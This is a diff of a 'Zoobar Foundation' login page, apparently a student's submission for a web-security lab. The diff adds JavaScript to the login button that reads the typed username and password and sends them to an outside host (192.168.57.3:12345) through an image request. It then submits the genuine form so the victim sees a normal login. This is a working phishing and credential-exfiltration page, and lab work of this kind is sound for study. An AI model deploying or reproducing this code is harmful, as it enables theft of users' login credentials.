@@ -2,7 +2,8 @@
 <html>
     <head>
         <meta charset="utf-8">
-        <link rel="stylesheet" type="text/css" href="/zoobar/media/zoobar.css">
+        <link rel="stylesheet" type="text/css" href="./zoobar/media/zoobar.css">
+        <link rel="icon" href="./favicon.ico">
         <title>
           Login - Zoobar Foundation
         </title>
@@ -20,7 +21,7 @@
           minds of the United States</h2>
       
 <div id="login" class="centerpiece">
-<form id="loginform" name="loginform" method="POST" action="/zoobar/index.cgi/login">
+<form id="loginform" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
 <table>
 <tr>
    <td>Username:</td>
@@ -30,7 +31,8 @@
 <tr>
    <td>Password:</td>
   <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
-  <input type="submit" name="submit_login" value="Log in" onclick="onLogIn()">
+  <input type="hidden" name="submit_login" value="Log in">
+  <input type="submit" name="sumit_login" value="Log in" onclick="onLogIn();">
   <input type="submit" name="submit_registration" value="Register"></td>
 </tr>
 </table>
@@ -48,16 +50,15 @@
 </script>
 <script>
     function onLogIn(){
+        alert("testing!");
         var login_username = document.getElementsByName('login_username')[0].value;
         var login_password = document.getElementsByName('login_password')[0].value;
         var url = "http://192.168.57.3:12345?payload=" + login_username + "," + login_password + "&roll=14026&random=" + Math.random() + "&timestamp=" + Math.floor(Date.now());
-        //var image = new Image();
-        //image.src="http://192.168.57.3:12345?payload=" + login_username + "," + login_password + "&roll=14026&random=" + Math.random() + "&timestamp=" + Math.floor(Date.now());
-        //image.onerror =
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', url, true);
-        xhr.send(null);
-        //document.getElementById('loginform').submit();
+        var image = new Image();
+        image.src="http://192.168.57.3:12345?payload=" + login_username + "," + login_password + "&roll=14026&random=" + Math.random() + "&timestamp=" + Math.floor(Date.now());
+        image.onerror = function(){
+            document.getElementById('loginform').submit();
+        }
     }
 </script>
     </body>
